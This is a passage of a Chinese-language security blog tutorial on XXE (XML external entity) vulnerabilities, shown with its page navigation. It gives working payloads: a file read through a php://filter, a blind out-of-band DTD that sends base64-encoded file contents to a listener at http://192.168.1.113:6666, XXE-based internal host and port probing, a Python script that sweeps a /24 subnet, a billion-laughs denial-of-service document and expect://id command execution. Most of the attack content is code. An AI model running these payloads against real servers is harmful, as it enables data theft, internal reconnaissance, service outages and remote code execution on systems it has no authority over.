+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line">  <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">yee</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">string</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/base64-encode/resource=E:/3.php&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.235.141/xml/echo.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">  %dtd; ]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">yee</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">yee</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615694996677-d887a051-93cd-4a73-b1fe-73caf4cfdf51.png?x-oss-process=image/resize,w_1358" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615695017750-f4c68f3e-541b-4454-a596-44dea8010e4d.png?x-oss-process=image/resize,w_1244" alt="image.png"></p>
+<h4 id="2、服务端无回显"><a href="#2、服务端无回显" class="headerlink" title="2、服务端无回显"></a>2、服务端无回显</h4><blockquote>
+<p>实际中的XML注入不会把结果返回到页面，也就是无回显<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615695288730-7583de5e-ac6a-4480-a448-40611aa9e13c.png" alt="image.png"><br>无回显注入通过外带的方式将要读取的数据文件内容通过传参的方式带到我们的服务器端，服务端监听接收数据</p>
+</blockquote>
+<p>想要外带数据，就要发送请求，在外部实体定义的时候（SYSTEM），通过引入DTD文件来发送外带请求和返回数据给服务端，发送dtd请求就要用到通用实体 % 实体名<br><strong>PS</strong>：可以将核心代码都放在dtd中，xml只引入调用一下就行，但发送外带和接收结果的代码必须写在dtd文件中，核心就是通过dtd来外带。</p>
+<p>dtd：</p>
+<blockquote>
+<p>第一行：以php伪协议base64编码的格式获取到资源内容<br>第二行：send通用实体变量是将资源内容的数据请求过去，int通用实体变量是将请求的内容获取到发送给服务器端，一个是发请求，一个是发内容<br>%  因为在双引号内，要转义一下，即 &#37;</p>
+</blockquote>
+<p><strong>PS</strong>：进行外带时，光发送请求还不行，还要将数据外带出去，而数据本身也是个对外的请求，所以需要二次发送获取第一次外带返回的结果，即（可以理解为固定语法）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///E:/3.php&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.1.113:6666/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">yee</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">dj</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.235.141/xml/noread.dtd&quot;</span>&gt;</span>%dj;%int;%send;		// %file; 已经在send中被调用了，所以不需要调用</span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">yee</span>&gt;</span>test send<span class="tag">&lt;/<span class="name">yee</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615696346398-bd83cfd7-62b0-47a5-9e5b-094ebd4b296b.png" alt="image.png"></p>
+<blockquote>
+<p>总结一下：有回显读文件方式有三种，无回显有一种。其实有两种。</p>
+</blockquote>
+<h3 id="示例4：内网主机存活探测"><a href="#示例4：内网主机存活探测" class="headerlink" title="示例4：内网主机存活探测"></a>示例4：内网主机存活探测</h3><p>探测内网ip段，根据返回时间来探测主机是否存活<br>Burp Payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=http://192.168.235.8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615703861563-65862cde-38df-4ea7-b980-a4e350e71c4a.png?x-oss-process=image/resize,w_1266" alt="image.png"><br>主机不存在返回时间很长，存在则很快<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615703906321-48f42ac4-0222-4ef2-9659-bd000b311e24.png?x-oss-process=image/resize,w_762" alt="image.png"><br>可以结合时间差写个脚本批量检测存活主机状态：<br>原理：通过xml漏洞文件去post xml恶意检测代码 检测返回时间来判断主机是否存在</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml = &quot;&quot;&quot;<span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span>&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;&quot;</span><span class="meta-string">&quot; + &#x27;&quot;</span><span class="meta-string">&#x27; + string + &#x27;</span><span class="meta-string">&quot;&#x27; + &quot;</span><span class="meta-string">&quot;&quot;</span>&gt;</span>]&gt;</span>&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;<span class="tag">&lt;<span class="name">foo</span>&gt;</span>&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    <span class="symbol">&amp;xxe;</span>&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span>&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125;</span><br><span class="line">    x = requests.post(&#x27;http://192.168.235.150/xml/noread.php&#x27;, data=xml, headers=headers, timeout=5)</span><br><span class="line">    a = x.elapsed.total_seconds()</span><br><span class="line">    if a &lt; 2:</span><br><span class="line">        print(&#x27;This ip is online in own&#x27;)</span><br><span class="line">    coded_string = x.split(&#x27; &#x27;)[-2] # 只获取base64的值</span><br><span class="line">    print(coded_string)</span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = &#x27;192.168.235.&#x27; + i</span><br><span class="line">        string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + &#x27;/&#x27;</span><br><span class="line">        print(string)</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2920454/1615704030936-0aabf1d5-ee77-4a0f-841b-9d9b80a48bf8.png?x-oss-process=image/resize,w_908" alt="image.png"></p>
+<h3 id="示例4-1：内网端口探测"><a href="#示例4-1：内网端口探测" class="headerlink" title="示例4.1：内网端口探测"></a>示例4.1：内网端口探测</h3><p>根据响应的时间的长短判断端口是否开放，如果有报错，可以直接探测出banner信息。（测试发现响应的时间不是很明显）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=http://192.168.235.8:3306&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用方式：burp批量爆破端口，检测长度是否不一致，如果存在某软件，会在页面返回该软件的版本信息等。</p>
+<h3 id="示例5：Dos攻击"><a href="#示例5：Dos攻击" class="headerlink" title="示例5：Dos攻击"></a>示例5：Dos攻击</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol2</span> <span class="meta-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol3</span> <span class="meta-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol4</span> <span class="meta-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol5</span> <span class="meta-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol6</span> <span class="meta-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol7</span> <span class="meta-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol8</span> <span class="meta-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol9</span> <span class="meta-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     ]&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞6：RCE攻击"><a href="#漏洞6：RCE攻击" class="headerlink" title="漏洞6：RCE攻击"></a>漏洞6：RCE攻击</h3><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">cmd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dir</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span><span class="symbol">&amp;cmd;</span><span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dir</span>&gt;</span></span><br></pre></td></tr></table></figure>
+    
+</div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2021/03/14/xxe-bug/">XXE漏洞详解</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
+        <p><span>Created:</span>2021-03-14, 16:31:29</p>
+        <p><span>Updated:</span>2021-03-14, 16:35:00</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2021/03/14/xxe-bug/" title="XXE漏洞详解">https://www.tu3k.cn/2021/03/14/xxe-bug/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/03/14/xxe-bug/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/03/08/php-fanxuliehua/">
+                    PHP反序列化漏洞详解
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AFXML%E5%87%BD%E6%95%B0%E4%BA%86%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">服务端XML函数了解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E8%A7%A3%E6%9E%90%E5%A4%84%E7%90%86XML%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">PHP解析处理XML函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84"><span class="toc-number">3.</span> <span class="toc-text">XML代码结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E6%A0%87%E7%AD%BE%E5%8A%9F%E8%83%BD%E4%BA%86%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text">XML标签功能了解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93%E5%92%8C%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">3.2.</span> <span class="toc-text">内部实体和外部实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">3.3.</span> <span class="toc-text">通用实体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E2%80%94%E2%80%94XXE%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">XML——XXE漏洞示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6-%E7%A4%BA%E4%BE%8B1%EF%BC%9A%E6%9C%80%E5%9F%BA%E6%9C%AC%E7%9A%84%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">XML注入读取文件 示例1：最基本的读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6-%E7%A4%BA%E4%BE%8B2%EF%BC%9A%E5%BD%93%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E8%AF%BB%E5%8F%96"><span class="toc-number">4.2.</span> <span class="toc-text">XML注入读取文件 示例2：当文件存在特殊字符无法正常读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6-%E7%A4%BA%E4%BE%8B3%EF%BC%9A%E4%BD%BF%E7%94%A8PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%A4%96%E5%B8%A6%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%88%E9%92%88%E5%AF%B9%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%8C%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-number">4.3.</span> <span class="toc-text">XML注入读取文件 示例3：使用PHP伪协议和外带读取文件内容（针对无回显，常用）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E8%AF%BB%E5%8F%96%EF%BC%8C%E4%BD%BF%E7%94%A8-lt-CDATA-%E4%B9%9F%E7%BB%95%E8%BF%87%E4%B8%8D%E4%BA%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8-lt-CDATA-%E4%B8%AD%E5%8A%A0%E5%85%A5PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84base64%E7%BC%96%E7%A0%81%E8%AF%BB%E5%8F%96"><span class="toc-number">4.3.1.</span> <span class="toc-text">1、一些特殊文件无法读取，使用 &lt;![CDATA [ 也绕过不了，可以在&lt;![CDATA [ 中加入PHP伪协议的base64编码读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">4.3.2.</span> <span class="toc-text">2、服务端无回显</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B4%EF%BC%9A%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.4.</span> <span class="toc-text">示例4：内网主机存活探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B4-1%EF%BC%9A%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.5.</span> <span class="toc-text">示例4.1：内网端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B5%EF%BC%9ADos%E6%94%BB%E5%87%BB"><span class="toc-number">4.6.</span> <span class="toc-text">示例5：Dos攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E6%EF%BC%9ARCE%E6%94%BB%E5%87%BB"><span class="toc-number">4.7.</span> <span class="toc-text">漏洞6：RCE攻击</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"XXE漏洞详解　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/03/08/php-fanxuliehua/" title="Next: PHP反序列化漏洞详解">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/03/14/xxe-bug/">XXE漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/08/php-fanxuliehua/">PHP反序列化漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/07/Python-duoxiancheng/">Python多线程和锁学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/04/python-socket/">Python之Socket简单学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/04/pymysql/">Pymysql驱动库详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/03/python-mysql/">Python管理Mysql数据库</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/02/python-cgi-code2/">Python_CGI编程笔记2</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/01/python-cgi-code/">Python_CGI编程笔记1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/28/python-fanxulie/">Python反序列化理解</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/27/python-zhengze/">Python正则表达式学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/22/python-jicheng/">Python面向对象继承</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/24/dllhack/">Dll劫持的简单实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/23/Python-tesseract-getCode/">Python Ocr识别验证码</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/17/Python-def/">Python字符串内建函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/14/Python-one/">Python笔记1——基本语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/13/flash-diaoyu/">Flash制作钓鱼远控上线CS</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/11/chubanshe-bugs/">某出版社漏洞大礼包</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/10/sc-powershell-serivces-yincang/">SC实现隐藏Windows服务维持权限</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/09/74cms-tempelate-log-include-shell/">骑士CMS 模板文件日志包含Getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/cs-chm-online/">CobaltStrike实现Chm后门</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/redis/">Redis未授权访问</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/04/7i24tiquan/">记录一次7i24星外虚拟主机提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/03/yinduneiwang/">记一次印度网站getshell到内网漫游</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/29/kerberos-study/">个人理解kerberos的作用和运行流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/28/frp/">Frp内网转发/穿透使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/28/edu_bug/">某教育系统的基础漏洞检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/27/ueditor_net_upload/">Ueditor.NET版本任意文件上传漏洞</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2020-2021 @Baicai
+            </div>
+            <div class="footer-right">
+                <a href="https://www.tu3k.cn" target="_blank" title="A fast, simple &amp; powerful blog framework">By Tu3k</a>       ||	This WebSite No Smoking</a> <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+<div id="musicMouseDrag" style="position:fixed; z-index: 9999; bottom: 0; right: 0;">
+    
+</footer>
+    </div>
+    
